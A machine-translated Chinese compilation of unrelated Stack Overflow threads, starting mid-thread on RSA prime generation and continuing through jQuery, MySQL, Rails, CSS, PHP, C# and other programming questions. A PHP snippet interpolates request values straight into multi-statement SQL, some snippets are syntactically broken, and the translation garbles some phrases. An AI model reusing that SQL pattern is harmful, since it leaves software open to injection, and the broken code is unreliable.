> 赞同：100
> 
> 时间：2013-04-18T19:40:38.613

RSA 不会从已知素数列表中进行选择：它会生成一个新的非常大的数字，然后应用一种算法来找到一个几乎可以肯定是素数的附近数字。请参阅[大型素数生成的有用描述](https://crypto.stackexchange.com/questions/71/how-can-i-generate-large-prime-numbers-for-rsa)）：

> 生成大素数的标准方法是采用预选的所需长度的随机数，应用费马测试（最好以 2 为底，因为它可以优化速度），然后应用一定数量的 Miller-Rabin 测试（取决于长度和允许的错误率，例如 2−100）得到一个很可能是素数的数字。

（你可能会问，为什么在这种情况下，当我们试图找到越来越大的素数时，我们没有使用这种方法。答案是已知最大的素数[有超过 1700 万位](http://en.wikipedia.org/wiki/Largest_known_prime_number)- 甚至远远超出了通常使用的非常大的数字在密码学中）。

至于是否可能发生冲突 - 现代密钥大小（取决于您所需的安全性）范围从 1024 到 4096，这意味着质数范围从 512 到 2048 位。这意味着您的质数约为 2^512：超过 150 位。

`1 / ln(n)`我们可以使用（见[这里](http://primes.utm.edu/howmany.shtml)）非常粗略地估计素数的密度。这意味着在这些`10^150`数字中，大约`10^150/ln(10^150)`有素数，可以`2.8x10^147`从中选择素数——当然比任何列表都多！

所以是的——这个范围内的素数数量惊人地多，碰撞实际上是不可能的。（即使你生成了一万亿个可能的素数，形成一个 septillion 组合，它们中的任何两个是相同素数的机会都是`10^-123`）。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2015-10-16T17:00:03.877

随着新研究的出现，您的问题的答案变得更加有趣。在 David Adrian 等人最近发表的一篇论文“Imperfect Forward Secrecy:How Diffie-Hellman Fails in Practice”中发现[@https:](https://weakdh.org/imperfect-forward-secrecy-ccs15.pdf) //weakdh.org/imperfect-forward-secrecy-ccs15.pdf 研究人员于 2015 年 10 月 16 日访问表明尽管可能有足够数量的素数可用于 RSA 的 1024 位密钥集，但由于实施，整个密钥集中的密钥组更有可能被使用。

> 我们估计，即使在 1024 位的情况下，在给定民族国家资源的情况下，计算也是合理的。数以百万计的服务器使用少量固定或标准化的组；对单个 1024 位组执行预计算将允许对 18% 的流行 HTTPS 站点进行被动窃听，第二组将允许解密到 66% 的 IPsec VPN 和 26% 的 SSH 服务器的流量。仔细阅读已发布的 NSA 泄密文件表明，该机构对 VPN 的攻击与实现这样的突破是一致的。我们得出结论，转向更强大的密钥交换方法应该是 Internet 社区的优先事项。

该研究还显示了 TLS 中的一个缺陷，该缺陷可能允许中间人攻击者将加密降级到 512 位。

因此，在回答您的问题时，纸上的 RSA 加密中可能有足够数量的素数，但实际上，如果您躲避某个民族国家，则会出现安全问题。

# jquery - 解析从 cfquery 创建的 json 时出错

> ID：16091582
> 
> 赞同：1
> 
> 时间：2013-04-18T19:34:34.687
> 
> 标签：jquery, coldfusion, cfml

我一生都无法弄清楚这是怎么回事。通常，我不会通过 json 从查询中返回数据，但在这种情况下我需要这样做。

这是CFC函数：

```
<cffunction name="f1" access="remote" returnformat="JSON" >
    <!---query goes here --->
    <cfreturn thequery>
</cffunction> 
```

这是JSON：

```
{"COLUMNS":["C1"],"DATA":[["1"],["2"],["3"]]} 
```

通常，我会创建一个结构，并用我想要返回的数据填充它，一切正常。

我将它传递回调用页面，并根据需要使用它，但无论出于何种原因，我似乎无法让 json 在调用页面上正确解析。我正进入（状态`JSON.parse: unexpected character error`

jQuery：

```
$.post("myCFC.cfc",{method:"f1"},
    function(response){
        var data = $.parseJSON(response);
        //doing stuff here, but can't parse the json, so it doesn't matter
    },
    "json"); 
```

所以，我想我会尝试只使用数据，因为在这种特殊情况下我不关心列名。那没有用，所以现在我在这里。

有人可以阐明我做错了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:36:05.603

`$.parseJSON`如果您提供 json 数据类型，请不要使用。jQuery 会自动为你做这件事。

```
$.post("myCFC.cfc",{method:"f1"},
    function(data){
        //var data = $.parseJSON(response);
        //doing stuff here, but can't parse the json, so it doesn't matter
    },"json"); // <-- here is where you supplied the json datatype 
```

# mysql - 在 groupon-by 中选择前 3 名的单个 MySQL 查询？

> ID：16091583
> 
> 赞同：0
> 
> 时间：2013-04-18T19:34:40.173
> 
> 标签：mysql

我有一个表交易，列是名称、金额、部门、类别。对于每个部门类别组合，我想找到数量最多的前 3 个条目。最终结果应采用以下格式：名称、部门、类别。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:44:57.137

```
 $db = new PDO($hostname,$username,$password);
   $query = 'Select name, division, category 
     From deals Where division = :division And category = :category 
     ORDER BY amount DESC Limit 3'; 
```

然后创建所有部门和类别的数组并循环它们：

```
$top3s = array();
foreach($divisionArray as $division)
{
  foreach($categoryArray as $category)
  {
    $statement = $db->prepare($query);
    $statement->bindValue(':division', $division);
    $statement->bindValue(':category', $category);
    $statement->execute();
    $top3 = $statement->fetch(PDO::FETCH_ASSOC);
    $statement->closeCursor();

    array_push($top3s, $top3);
  }
}
print_r $top3s; 
```

# ruby-on-rails - 在rails中的单个表单上有多个提交按钮的正确方法

> ID：16091586
> 
> 赞同：0
> 
> 时间：2013-04-18T19:34:58.323
> 
> 标签：ruby-on-rails, ajax, forms, submit-button

我的 Rails 应用程序中有一个页面，要求我在一个表单上具有多个提交按钮。为了让您了解我想要做什么，我有一个购物车，它是一张物品表。每个项目都有一个订购按钮和一个删除按钮。还有一个与每个项目关联的复选框，以便可以选择多个项目，然后通过我表格底部的按钮提交订单。

目前，这三个按钮中的每一个都具有与之关联的不同“名称”属性。在我的控制器中，我有类似于以下的代码：

```
if params[:remove]
  #do stuff to remove item from shopping cart, then re-direct back to shopping cart
elsif params[:order_one]
  #do stuff to order item, then render a confirm page
else
  #do stuff to order multiple items, then render confirm page
end 
```

但这对我来说似乎很乱。有没有更好的“railsy”方式来实现这一点？

另外，我目前没有在我的页面中使用任何 JS/Ajax，我希望最终让购物车成为通过 Ajax 呈现的 div。当用户单击删除按钮时，我希望远程提交表单，以便一旦将商品从购物车中删除，购物车 div 就可以通过 Ajax 重新呈现 - 这是否有可能拥有一个具有一个按钮通过ajax提交一些表单，一些没有ajax的表单？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:29:24.663

这是一个庞大的主题，但对于 ajax 删除按钮，您可以像这样开始。在您的表格视图中，使用：

```
<tr id="tr_<%= item.id %>">
  ...
  <%= link_to 'delete', item, method: :delete, remote: true %>
</tr> 
```

您必须在您的销毁路由上处理 ajax 调用`items_controller.rb`：

```
def destroy
  @item= Item.destroy(params[:id])
  respond_to do |format|
    format.html { redirect_to items_url }
    format.js
  end
end 
```

在您的项目视图文件夹中创建一个新`destroy.js.erb`文件并将其放入：

```
$('#your_table').remove('#tr_<%= @item.id %>'); 
```

然后，当您单击删除按钮时，它将调用控制器中的销毁操作。由于按钮被定义为远程，rails 将自动执行 ajax 请求并且不会重新加载页面。您的控制器将呈现相应的 js 视图，然后您在其中从表中删除该行。

正如我所说，这只是一个开始，它可以在 javascript 方面做得更好。另请注意，我没有检查代码。

另请查看[http://railscasts.com/episodes/136-jquery-ajax-revised?view=asciicast](http://railscasts.com/episodes/136-jquery-ajax-revised?view=asciicast) 以获得更深入的解释。

# css - div 的 margin-top / padding-top 问题。显示块等不工作

> ID：16091588
> 
> 赞同：0
> 
> 时间：2013-04-18T19:35:02.147
> 
> 标签：css, html

我对编码有点陌生，在过去的几周里，我发现这些板真的很有帮助，但我遇到了其他帖子无法帮助我解决的问题，所以这里是：

我在一个矩形 div 中有许多 div，跨度为 880 像素。左对齐的 div 运行良好，但浮动的右 div，一个名为 #shopvid_2013_01 的 560 像素视频不会正确排列。

我想要它，以便#shopvid_2013_01 div 正好在#shop_13_01 div 旁边排列，但是当我在 Firefox 上预览它时，它似乎就在我拥有的另一个 div 的下方，并且无论 margin-top 或 padding 是什么都不会移动-我使用的顶部。当我阅读其他可能有帮助的帖子时，我尝试添加 display:block 和 overflow:hidden，但无济于事。

任何帮助，将不胜感激！

我已经包含了我的相关 html 和 css：

HTML

```
<div id="shop_13">    
    <div id="shop_13_01">
        <div id="shop_13_text_01">
            <div id="shop_smlheading">
                <p><b>West Cork Rally 2013</b></p>
            </div>
            <div id="shop_p_13">
                <p>Our highlights video from a cracking weekend in Clonakilty.</p>
            </div>
            <div id="buy_shop_01">
                <form target="paypal" action="https://www.paypal.com/cgi-bin/webscr" method="post"    target="_top">
                    <input type="hidden" name="cmd" value="_s-xclick">
                    <input type="hidden" name="hosted_button_id" value="6D49SM33FHD8U">
                    <input type="image" src="01 Images/buy_now_price.png" border="0" name="submit" alt="Buy Now">
                    <img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif"  width="1" height="1">
                </form>
            </div>
        </div>
    </div>
    <div class="shopvid_2013_01">
        <iframe width="560" height="315" src="http://www.youtube.com/embed/ozXu2-Zf5B0" frameborder="0" allowfullscreen></iframe>
    </div>
</div> 
```

CSS

```
#shop_13 {
    width:880px;    
}

#shop_13_01 {
    width: 320px;
    height:315px;
    margin:30px 0 0 0;
    background-color:#E9E9E9;
    float:left;
}

#shop_13_text_01 {
    font-family: "Arial", sans-serif;
    width:240px;
    font-size:13px;
    line-height:1.4em;
}

#shop_smlheading {
    padding: 5px 0 0 20px;
    font-size:15px;
}

#shop_p_13 {
    font-family: "Arial", sans-serif;
    width:240px;
    font-size:13px;
    line-height:1.4em;
    margin: -15px 0 0 20px;
    float:left;
}

#buy_shop_01 {
    padding: 100px 0 0 0;
    float:left;
}

#shopvid_2013_01 {
    width: 560px;
    height:315px;
    float: right;
    margin-top: 30px;
    display:block;
    overflow:hidden;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:40:26.607

您似乎将其引用`shopvid_2013_01`为 ID 而不是 CLASS。尝试这个：

```
.shopvid_2013_01 {
  width: 560px;
  height:315px;
  float: right;
  margin-top: 30px;
  display:block;
  overflow:hidden;
} 
```

[http://jsfiddle.net/gGtPK/](http://jsfiddle.net/gGtPK/)

# php - 使用表单验证插入数组时出错

> ID：16091592
> 
> 赞同：0
> 
> 时间：2013-04-18T19:35:09.370
> 
> 标签：php, forms, mysqli

我有三个关于使用 mysqli 的标签系统的表单验证的查询。.什么是转义 $tag_no 数组的最佳做法。.当 $tag_no 数组从整数作为字符串传递的形式传递时，所以 is_int 不能与 $tnumber 一起使用，有什么想法吗？.这是验证从表单传递的标签数组的整体最佳实践吗？

希望这是清晰简洁的，任何帮助将不胜感激。提前致谢。

```
$tag_no = $_GET['tno'];
$tno = mysqli_real_escape_string($link, $tag_no);

if ($tag_no != false) {
   $query = "INSERT INTO `uc` (`UNO`, `BNO`) VALUES ('$uno', '$box');";
   foreach ($tag_no as $tnumber) {
      if (is_int($tnumber)) {
         $query .= "
         INSERT INTO `ut` (`UNO`, `TNO`) VALUES ('$uno', '$tnumber')";
      } else {
         $query .= "INSERT INTO tags (TName) VALUES ('$tagname')"; 
      }
   };
};
mysqli_multi_query($link, $query); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:38:45.757

即使你使用[`mysql_multi_query()`](http://www.php.net/manual/en/mysqli.multi-query.php)你也必须使用';' 将单个查询分开。

因此，将您的代码更改为：

```
foreach ($tag_no as $tnumber) {
    if (is_int($tnumber)) {
        $query .= "
        INSERT INTO `ut` (`UNO`, `TNO`) VALUES ('$uno', '$tnumber');"; # <-- note the ;
    } else {
         $query .= "INSERT INTO tags (TName) VALUES ('$tagname');"; # <-- note the ;
    }
 } 
```

我也很确定，这将失败：

```
 foreach ($tag_no as $tnumber) 
```

as`$tag_no`实际上是一个字符串，而 foreach 需要一个数组。（您已将其与. 一起使用`mysqli_real_escape_string()`。）

# highcharts - 在y轴上显示最后一个标签时范围选择器的Highcharts填充？

> ID：16091594
> 
> 赞同：0
> 
> 时间：2013-04-18T19:35:12.297
> 
> 标签：highcharts, highstock

当我显示 yaxis 的最后一个标签时，范围选择器的间距变得拥挤。

示例：http: [//jsfiddle.net/georgeludwig/FttkQ/7/](http://jsfiddle.net/georgeludwig/FttkQ/7/)

你可以看到“75”和“30”是如何卡在那里的。

有没有办法在范围选择器周围获得更多空间？我一直在搞乱各种填充值，​​但没有任何效果。

代码：

```
<code>
$(function () {
    var chart = new Highcharts.StockChart({
        chart: {
            renderTo: 'container',
            alignTicks: false
        },

        yAxis: [{ // Primary yAxis
                endOnTick: true,
                showLastLabel: true,
                title: {
                    text: 'Time Published',
                    style: {
                        color: '#89A54E'
                    }
                },
                gridLineWidth: 0,
                opposite: true,

            }, { // Secondary yAxis
                showLastLabel: true,
                title: {
                    text: '% Audience Coverage',
                    style: {
                        color: '#4572A7'
                    }
                },

            }],

        series: [{

            yAxis: 0,
            type: "scatter",
            data:[ [1142294400000,2],
                   [1183334400000,5],
                   [1199232000000,18],
                   [1230768000000,9],
                   [1262304000000,4],
                   [1294012800000,20],
                   [1325548800000,1],
                   [1357084800000,6] ]

        }, {

            yAxis: 1,
            type: "areaspline",
            data:[ [1142294400000,9],
                   [1183334400000,10],
                   [1199232000000,15],
                   [1230768000000,25],
                   [1262304000000,35],
                   [1294012800000,46],
                   [1325548800000,47],
                   [1357084800000,68] ]

        }]
    });
});
</code> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T08:23:58.140

您可以使用 maxPadding ( [http://api.highcharts.com/highcharts#yAxis.maxPadding](http://api.highcharts.com/highcharts#yAxis.maxPadding) ) 设置 tickInterval ( [http://api.highcharts.com/highcharts#yAxis.tickInterval](http://api.highcharts.com/highcharts#yAxis.tickInterval) )

[http://jsfiddle.net/FttkQ/9/](http://jsfiddle.net/FttkQ/9/)

```
yAxis: [{ // Primary yAxis
            showLastLabel: false,
            title: {
                text: 'Time Published',
                style: {
                    color: '#89A54E'
                }
            },
            gridLineWidth: 0,
            opposite: true,
            tickInterval:10,
            maxPadding:1

        }, { // Secondary yAxis
            showLastLabel: false,
            maxPadding:0.2,
            tickInterval:25,
            title: {
                text: '% Audience Coverage',
                style: {
                    color: '#4572A7'
                }
            },

        }], 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T08:30:16.297

@Sebastian Bochan，我们不能使用 rangeSelector 吗？为什么此 rangeSelector 不适用于缩放按钮？

rangeSelector: { inputPosition: { y: 5 } }

# eclipse - Xtext 和 GMF 集成

> ID：16091598
> 
> 赞同：3
> 
> 时间：2013-04-18T19:35:18.247
> 
> 标签：eclipse, xtext, eclipse-gmf

首先，我在stackoverflow 上看到了很多关于将XText 与GMF 集成的链接。

到目前为止我见过的最一致的教程是：http: [//www.eclipse.org/forums/index.php/mv/msg/472225/1036564/#msg_1036564](http://www.eclipse.org/forums/index.php/mv/msg/472225/1036564/#msg_1036564)

..但在最后一步甚至没有生成文本编辑器（仅 GMF 编辑器）。

我也看到了文档，但我无法理解他们在这个链接中的建议：http: [//www.eclipse.org/Xtext/documentation.html#gmf_integration](http://www.eclipse.org/Xtext/documentation.html#gmf_integration)

所以我想知道是否有人知道如何有效地将 GMF 与 Xtext 与现有的 ecore 集成！使用 XText 2.0.4。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-15T10:08:38.537

根据您使用 GMF 的固定程度，您可能需要查看[Graphiti](http://www.eclipse.org/graphiti/)（基于 GEF 构建）。

> Graphiti 是一个基于 Eclipse 的图形框架，它支持为领域模型快速开发最先进的图表编辑器。Graphiti 可以非常轻松地使用基于 EMF 的域模型，但也可以在域端处理任何基于 Java 的对象。

有一个 Eclipse Labs 项目用于使用称为[Spray](https://code.google.com/a/eclipselabs.org/p/spray/)的 XText DSL 创建 Graphiti 编辑器。

> 该项目旨在提供一种或多种领域特定语言（DSL）来描述针对 Graphiti 运行时的 Visual DSL 编辑器，并提供代码生成以创建样板代码以实现针对 Graphiti 框架的实现。潜在地，Spray DSL 也可用于为其他框架生成代码。

您可以将您的 DSL ecore 模型导入 Spray，并使用对您的 DSL 类型的引用创建一个具有相对较少样板的图形编辑器。CodeGen 2012 上的演示（SprayCodeGeneration2012.pdf 在上面的 Google 代码链接上）强调了 Spray 的一些功能。

# c# - Razor 在重构后使用模型中自定义类的旧名称

> ID：16091602
> 
> 赞同：1
> 
> 时间：2013-04-18T19:35:45.750
> 
> 标签：c#, asp.net-mvc, razor

我的网站上有多个项目，这里暗示的项目是：

*   `Common`: 包含一个我使用重构重命名的类（比如我将它重命名为`OldName`to `NewName`）
*   `ViewModels`: 包含一个名为 ViewModel 的视图模型`MyModel`，它有一个类型的属性，`OldName`但现在它的类型是`NewName`
*   网站：一个带有剃须刀的 asp.net mvc4 网站，我尝试在其中显示一个文本框`@Html.EditorFor(model => model.Town)`

`public OldName Town { get; set; }`当我完成重构时，一切都是正确的，我的模型中的类型发生了变化并从`public NewName Town { get; set; }`

但是当我运行我的应用程序并尝试执行`@Html.EditorFor(model => model.Town)`实现它的剃刀模板时，它会不断抛出异常说`There is no type 'OldName' in the model`......

我尝试删除临时 asp.net 文件，删除 bin/debug 文件夹，更改所涉及的剃刀模板，重建解决方案，停止服务器并再次尝试所有这些，但没有任何效果，我仍然遇到同样的错误。

在谷歌上也没有找到任何关于它的东西......（但也许我没有输入正确的关键字）。

有谁知道我如何解决这个问题？

在此先感谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:40:48.027

您将不得不将`model`EditorTemplate 中的类型更改为`NewName`，并将 EditorTemplate 的实际文件名更改为`NewName.cshtml`.

# mysql - 在 WHERE 和 AND 上使用“不在”？

> ID：16091609
> 
> 赞同：4
> 
> 时间：2013-04-18T19:36:08.490
> 
> 标签：mysql

我试图更好地理解“不在”如何与 MySQL 中的 WHERE 一起工作。

例如：

```
SELECT * FROM current_mailing_list 
WHERE address1 NOT IN
    (select address1 from old_mailing_list) AND
    city not in (select city from old_mailing_list); 
```

在上面的示例中，查询的目的是列出新的邮寄地址。`address1`是街道地址，例如`1234 N. Main St`. 当`1234 N. Main St`发生在多个城市时，问题就会发生，这可能会发生。所以我决定添加`city`它以使其更加独特。

我的问题是，这是否符合我的预期？`old_mailing_list` **意思是，它应该找到那些在AND**中不存在的街道地址（address1），然后确保它们具有不同的`city`.

我已经这样做了，只是使用地址1：

```
SELECT * FROM current_mailing_list 
WHERE address1 NOT IN 
    (select address1 from old_mailing_list); 
```

它产生了一个更大的列表（大约是大小的 10 倍）。所以我想补充`city`一下。还是我的逻辑完全错误，需要另一种方法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-18T19:43:47.543

您当前的查询将不会返回他们的“address1”或“city”*根本出现在*旧邮件列表中的新地址。我认为您想选择它们不会*同时出现*的城市，如下所示：

```
SELECT *
FROM current_mailing_list c
WHERE NOT EXISTS
(
    SELECT 1
    FROM old_mailing_list
    WHERE
        address1 = c.address1
        AND city = c.city
) 
```

毫不夸张的说; 从当前邮件列表中选择旧邮件列表中没有具有相同城市和地址的记录的所有内容1。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-18T19:47:00.753

要使用`NOT IN`，您需要将 city 和 address 组合在同一个子句中，因为 MySQL 支持此方法（其他 RDBMS 不支持此方法）。正如其他人指出的那样，单独使用两者不会获得所需的结果。

如果你想使用，试试这个`NOT IN`：

```
SELECT * 
FROM current_mailing_list 
WHERE (address1,city) NOT IN  
   (select address1, city from old_mailing_list); 
```

[示例 SQL Fiddle 演示](http://sqlfiddle.com/#!2/45baab/2)

我个人更喜欢使用 a`LEFT JOIN`并检查 NULL：

```
SELECT c.* 
FROM current_mailing_list c
    LEFT JOIN old_mailing_list o ON c.address1 = o.address1 AND c.city = o.city
WHERE o.address1 IS NULL 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-18T19:42:42.117

如果 1234 N. Main St. 是旧邮件列表中的城市和新邮件列表中的城市的地址，则您的查询将排除这两个地址。您的查询与它所说的完全一样：您将获得*街道*地址和城市*不在*旧邮件列表中的地址。如果*任*一地址出现在旧邮件列表中，则不会检索该地址。

# c# - 无法将 MVC 模型属性绑定到输入元素

> ID：16091610
> 
> 赞同：2
> 
> 时间：2013-04-18T19:36:08.527
> 
> 标签：c#, asp.net-mvc, model-binding

我无法让我的模型绑定到由自定义帮助方法创建的输入框。我用一个名为“Html.AutoCompleteBoxAjax”的辅助方法包装了一个 jquery ajax 驱动的自动完成框。这个助手基本上只是创建一个带有 javascript 自动完成功能的元素。

模型中的属性是一个名为“formatName”的字符串。我已经验证，在为视图生成的 html 中，输入元素的名称和 id 都是“formatName”，并且没有其他具有这些身份的元素。我还检查了模型是否具有默认构造函数，并且“formatName”属性是可公开访问的。最后，我验证了当 Channel 模型被传递到视图中时，Channel.formatName 具有正确的值。然而，尽管如此，我无法获得绑定到元素的值，并且输入框保持空白。反过来，从视图到控制器也没有绑定，Channel.formatName 保持空白。

我错过了什么？是不是因为我使用了自定义辅助方法？

**模型：**

```
namespace WebApp.Models
{
    public class ChannelModel
    {
        XYZ.DataAccess.ODS.DB db = Config.DB();

        public string id { get; set; }

        // Parent Project
        [Display(Name = "Project")]
        public string projectID { get; set; }

        // Format Name
        [Required(ErrorMessage = "Format is required.")]
        [RegularExpression(Constants.username_regex, ErrorMessage = Constants.username_regexErrorMsg)]
        [Display(Name = "Format")]
        public string formatName { get; set; }

        // Channel Name
        [Required(ErrorMessage="Channel name is required.")]
        [StringLength(100, ErrorMessage = Constants.minLengthErrorMsg, MinimumLength = Constants.username_minLength)]
        [RegularExpression(Constants.username_regex, ErrorMessage = Constants.username_regexErrorMsg)]
        [Display(Name = "Channel name")]
        public string name { get; set; }

        // Sequence
        [Display(Name = "Sequence")]
        public string sequenceID { get; set; }

        public ChannelModel()
        {
            id = Guid.NewGuid().ToString();
        }

        public ChannelModel(XYZ.DataAccess.ODS.Channel channel_db)
        {
            id = channel_db.id;
            projectID = channel_db.project_id;
            name = channel_db.name;
            formatName = channel_db.format_name;
            sequenceID = channel_db.sequence_id;
        }

        public XYZ.DataAccess.ODS.Channel buildDBObject()
        {
            XYZ.DataAccess.ODS.Channel channel = new XYZ.DataAccess.ODS.Channel();
            channel.id = id;
            channel.project_id = projectID;
            channel.name = name;
            channel.format_name = formatName;
            channel.sequence_id = sequenceID;
            return channel;
        }
    }

} 
```

**看法**

```
@model WebApp.Models.ChannelModel
@using HelperMethods.Infrastructure

@{
    ViewBag.Title = "Edit";

    var sequences = ViewData["sequences"] as List<SelectListItem>;
}

<h2>Edit</h2>

<script src="@Url.Content("~/Scripts/jquery.validate.min.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.min.js")" type="text/javascript"></script>

@section header {
}

@using (Html.BeginForm())
{
    @Html.ValidationSummary(true)
    <fieldset>
        <legend>Channel</legend>

        @Html.HiddenFor(model => model.id)
        @Html.HiddenFor(model => model.projectID)
        @Html.HiddenFor(model => model.name)

        <div class="editor-field">
            @Html.LabelFor(model => model.name):
            @Html.DisplayFor(model => model.name)
        </div>

        <div class="editor-label">
            @Html.Label("Format")
        </div>
        <div class="editor-field">
            @Html.AutoCompleteBoxAjax("formatName", Url.Action("GetFormatsBeginningWith"))
            @Html.ValidationMessageFor(model => model.formatName)
        </div>

        <!-- SEQUENCE -->
        <div class="editor-label">
            @Html.Label("Sequence")
        </div>
        <div class="editor-field">
            @Html.SlaveDropdownList("sequenceID", "groupID", Url.Action("GetSequencesInGroup"), WebApp.Util.makeSelectList(sequences, Model.sequenceID))
        </div>

        <p>
            <input type="submit" value="Save" />
        </p>
    </fieldset>
}

<div>
    @Html.ActionLink("Back to List", "Index")
</div> 
```

**控制器**

```
namespace WebApp.Controllers
{
    public class ChannelController : Infrastructure.NoCacheController
    {
        XYZ.DataAccess.ODS.DB db = Config.DB();

        -- stuff --

        [HttpGet]
        public ActionResult GetFormatsBeginningWith(string term)
        {
            var formats = db.getFormatsBeginningWith(term);

            List<CustomHelpers.AutocompleteItem> items = new List<CustomHelpers.AutocompleteItem>();
            foreach (var format in formats)
                items.Add(new CustomHelpers.AutocompleteItem { value = format.name, label = format.name });

            var j = Json(items, JsonRequestBehavior.AllowGet);
            return j;
        }

        public ActionResult Edit(string id)
        {
            ChannelModel channelModel = new ChannelModel(db.getChannel(id));

            string groupID = db.getProject(channelModel.projectID).group_id;
            var sequences = db.getSequencesInGroup(groupID);
            ViewData["sequences"] = makeSelectListItems(sequences);

            return View(channelModel);
        }

        //
        // POST: /Channel/Edit/5

        [HttpPost]
        public ActionResult Edit(ChannelModel model)
        {
            if (ModelState.IsValid)
            {
                db.updateChannel(model.buildDBObject());

                return RedirectToAction("Index");
            }

            string groupID = db.getProject(model.projectID).group_id; 
            var sequences = db.getSequencesInGroup(groupID);
            ViewData["sequences"] = makeSelectListItems(sequences);

            return View(model);
        }

        -- more stuff --
    }
} 
```

**AutoCompleteBox 的辅助方法**

```
 public static MvcHtmlString AutoCompleteBoxAjax(this HtmlHelper html, string id, string actionUrl)
    {
        TagBuilder input = new TagBuilder("input");
        input.Attributes.Add("id", id);
        input.Attributes.Add("name", id);
        input.Attributes.Add("type", "text");
        input.AddCssClass("autocomplete_ajax");
        input.Attributes.Add("value", "");
        input.Attributes.Add("action", actionUrl);

        var variables = new Dictionary<string, string>() {
            {"AUTOCOMPLETE_ID", id}
        };

        var script = populateScriptTemplate("TEMPLATE_autocomplete_ajax.js", variables);

        StringBuilder s = new StringBuilder();
        s.AppendLine(input.ToString(TagRenderMode.SelfClosing));
        s.AppendLine(script);

        return new MvcHtmlString(s.ToString());
    } 
```

**用于自动完成的 Javascript**

```
$('#AUTOCOMPLETE_ID').autocomplete({
    source: $('#AUTOCOMPLETE_ID').attr('action')
    }); 
```

**视图 html 的相关部分**

```
<div class="editor-field">
    <input action="/Channel/GetFormatsBeginningWith" class="autocomplete_ajax" id="formatName" name="formatName" type="text" value="" />
    <span class="field-validation-valid" data-valmsg-for="formatName" data-valmsg-replace="true"></span>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T13:52:28.013

通过@Jakub 的输入，答案变得很简单。助手本身必须填充值；html 助手没有自动绑定。一旦我解决了这个问题，自动将帖子绑定回控制器就会按预期工作。

# c# - 流 - 无法访问已关闭的流

> ID：16091612
> 
> 赞同：1
> 
> 时间：2013-04-18T19:36:11.073
> 
> 标签：c#, stream

我遇到的一个小问题`Stream`，我在标题中遇到了异常。

我将它放在`using`一个循环内的语句中，我看到的大多数帖子只是说删除该`using`语句并“更新”它：[无法访问 memoryStream 的封闭流，如何重新打开？](https://stackoverflow.com/questions/9508879/cannot-access-a-closed-stream-of-a-memorystream-how-to-reopen)

异常发生**在循环的第二次迭代中。**我试过删除`using`没有效果的语句。

这是一般的想法：

```
for (blah blah blah) 
{
    using (Stream strm = externalStreamProvider.GetStream(some params)
    { 
        if (stream.Position != 0) //exception is here on 2nd iteration
            ...........
    }
} 
```

但是，我正在使用[Stream](http://msdn.microsoft.com/en-us/library/system.io.stream.aspx)，它是抽象的，所以我不能像`myStream = new Stream()`.

我正在使用外部`Stream`提供程序，因此无法更改`Stream`获取方式。

有关如何解决此问题的任何想法？

对于任何含糊之处，我深表歉意，如果有不清楚的地方，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:34:24.000

似乎`externalStreamProvider`每次都返回相同的流实例......并且由于您在第一次迭代中关闭它，它在第二次迭代中失败。

如果您希望在每次迭代中都使用相同的流，则应该将流置于循环之外：

```
using (Stream strm = externalStreamProvider.GetStream(some params)
{
    for (blah blah blah) 
    { 
        if (stream.Position != 0)
            ...........
    }
} 
```

编辑：刚刚看到这个评论：

> 当引发异常时，`stream.Position`它是第二次迭代的全新 Stream 实例

在这种情况下，唯一的解释是`externalStreamProvider`返回一个已经关闭的流；但是问题不在于您发布的代码中...

# c# - C# 装饰器 - 接口还是抽象类？

> ID：16091613
> 
> 赞同：7
> 
> 时间：2013-04-18T19:36:17.017
> 
> 标签：c#, decorator

这个线程，[装饰器模式实现](https://stackoverflow.com/questions/8959346/decorator-pattern-implementation)，有一个使用抽象类的装饰器实现。我不喜欢这样一个简单的事实，即 CondimentDecorator 在给定的实现中不是饮料。我会改用接口。抽象类不是更适合 is-a 关系，而接口不是更适合 has-a 关系吗？

```
public interface IBeverage
{
    // get a description of the beverage
    String Description { get; }

    // calculate cost of the beverage
    double Cost { get; }
}

// HouseBlend coffee implements IBeverage
public class HouseBlend : IBeverage
{
    private string description;
    public String Description
    {
        get { return description; }
    }

    private double cost;
    public double Cost
    {
        get { return cost; }
    }

    // Constructor
    public HouseBlend() { description = "House Blend"; cost = 0.89;  }
}

// DarkRoast coffee implements IBeverage
public class DarkRoast : IBeverage
{
    private string description;
    public String Description
    {
        get { return description; }
    }

    private double cost;
    public double Cost
    {
        get { return cost;  }
    }

    // Constructor
    public DarkRoast() { description = "Dark Roast"; cost = 1.10; }
}

// Mocha is a Decorator
public class Mocha
{
    // Mocha has-a Beverage
    private IBeverage m_beverage;

    private string description;
    public String Description
    {
        get { return description; }
    }

    private public double Cost
    {
        get { return cost; }
    }

    // Constructor binds the object passed to member var
    public Mocha(IBeverage beverage)
    {
        m_beverage = beverage; // not necessary for the purpose of this example
        description = m_beverage.Description + ", Mocha";
        cost = 0.20 + m_beverage.Cost;
    }
}

Use like this:
    Mocha mhb = new Mocha(new HouseBlend()); // house blend with mocha flavor 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T20:50:21.827

基类和接口都经常用于建模 is-a 关系。即便是简单到`IDisposable`可以理解为“是一个生命周期可以手动控制的对象”、“一次性”的接口。更明显的区别在于是否允许基本实现或数据字段；以及他们组合多个层次结构的能力。

